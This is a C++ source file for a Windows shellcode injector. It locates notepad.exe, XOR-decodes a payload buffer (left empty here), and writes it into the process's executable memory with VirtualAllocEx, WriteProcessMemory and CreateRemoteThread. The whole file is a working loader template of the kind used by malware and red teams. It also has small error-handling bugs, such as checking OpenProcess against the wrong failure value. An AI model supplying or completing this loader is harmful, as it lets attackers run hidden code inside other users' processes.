#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>


int Error(const char* text)
{
    printf("%s (%u)\n", text, GetLastError());
    return 1;
}

DWORD GetProcessID(const wchar_t* targetProcess)
{
    uintptr_t processID = NULL;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapshot == INVALID_HANDLE_VALUE)
        return Error("Failed in CreateToolhelp32Snapshot");

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(processEntry);

    if (!Process32First(hSnapshot, &processEntry))
        return Error("Failed in Process32First");

    do
    {
        if (!wcscmp(processEntry.szExeFile, targetProcess))
        {
            processID = processEntry.th32ProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &processEntry));

    CloseHandle(hSnapshot);
    return processID;
}


int main()
{
    std::cout << "Hello World!\n";
    
    DWORD processID = GetProcessID(L"notepad.exe");

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, processID);

    if (hProcess == INVALID_HANDLE_VALUE)
        return Error("Failed in OpenProcess");

    unsigned char buf[] {  };

    unsigned char shellcode[sizeof(buf)];

    for (int i = 0; i < sizeof(buf); i++)
    {
        shellcode[i] = buf[i] ^ 0xCA;
    }


    LPVOID allocatedRegion = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (allocatedRegion == NULL)
        return Error("Failed in VirtualAllocEx");

    bool mem =  WriteProcessMemory(hProcess, allocatedRegion, shellcode, sizeof(shellcode), NULL);

    if (!mem)
        return Error("Failed in WriteProcessMemory");

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, LPTHREAD_START_ROUTINE(allocatedRegion), 0, 0, 0);
    CloseHandle(hThread);
}
